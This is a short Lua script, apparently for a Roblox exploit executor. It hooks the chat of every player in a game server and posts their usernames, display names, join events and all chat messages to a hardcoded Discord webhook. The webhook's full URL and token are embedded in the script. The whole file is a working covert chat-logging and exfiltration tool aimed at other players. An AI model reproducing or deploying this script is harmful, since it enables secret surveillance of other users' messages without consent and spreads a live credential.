wait(5)
local wh = 'https://discord.com/api/webhooks/815012606288592908/HxNZ9k3rLDsKF0H4XoRPCMOrxKNAamHp5T-72XlpL5V3IxroovlebyvmiFuNpgW_nRmv'

local embed1 = {
	['title'] = 'Beginning of Message logs in ' .. "this game (".. game.PlaceId .. ")".. " at "..tostring(os.date("%m/%d/%y"))
}

local a = syn.request({
   Url = wh,
   Headers = {['Content-Type'] = 'application/json'},
   Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
   Method = "POST"
})

Players = game:GetService("Players")

function logMsg(Webhook, Player, Message)
   local embed = {
       ['description'] = Player..": "..Message
   }
   local a = syn.request({
       Url = Webhook,
       Headers = {['Content-Type'] = 'application/json'},
       Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
       Method = "POST"
   })
end

for i,v in pairs(Players:GetPlayers()) do
	logMsg(wh, v.Name, " Is in the server")
   v.Chatted:Connect(function(msg)
       logMsg(wh, v.Name.."{" .. v.DisplayName .. "}", msg)
   end)
end

Players.PlayerAdded:Connect(function(plar)
   logMsg(wh, plar.Name, ": Player has joined")
end)

Players.PlayerAdded:Connect(function(plr)
   plr.Chatted:Connect(function(msg)
       logMsg(wh, plr.Name, msg)
   end)
end)